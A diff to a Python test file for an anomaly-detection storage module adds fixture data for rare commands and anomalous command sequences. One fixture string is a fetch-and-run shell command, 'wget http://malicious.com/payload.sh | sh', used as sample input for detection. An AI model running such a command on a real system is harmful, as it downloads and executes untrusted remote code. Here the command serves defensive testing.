@@ -125,6 +125,22 @@ def sample_analysis_result():
                 ],
                 "session_count": 2,
             },
+            {
+                "command": "suspicious_command_3",
+                "frequency": 1,
+                "rarity_score": 0.03,
+                "detection_type": "rare_command",
+                "sessions": [
+                    {
+                        "session_id": "test_session_005",
+                        "src_ip": "192.168.1.104",
+                        "timestamp": datetime.now(UTC),
+                        "duration": 350.0,
+                        "command_count": 4,
+                    }
+                ],
+                "session_count": 1,
+            },
         ],
         anomalous_sequences=[
             {
@@ -132,7 +148,13 @@ def sample_analysis_result():
                 "frequency": 1,
                 "anomaly_score": 0.95,
                 "detection_type": "anomalous_sequence",
-            }
+            },
+            {
+                "sequence": "wget http://malicious.com/payload.sh | sh",
+                "frequency": 2,
+                "anomaly_score": 0.98,
+                "detection_type": "anomalous_sequence",
+            },
         ],
         outlier_sessions=[
             {
@@ -197,7 +219,7 @@ class TestLongtailStorage:
 
             # Verify session links were created for rare commands
             session_links = session.query(LongtailDetectionSession).all()
-            assert len(session_links) == 3  # 1 + 2 sessions for the rare commands
+            assert len(session_links) == 4  # 1 + 2 + 1 sessions for the rare commands
 
     def test_pgvector_detection_sqlite(self, temp_db) -> None:
         """Test pgvector detection with SQLite (should return False)."""
@@ -394,7 +416,3 @@ class TestLongtailIntegration:
 
             detections = session.query(LongtailDetection).all()
             assert len(detections) >= 0  # May be 0 if no detections found
-
-
-
-
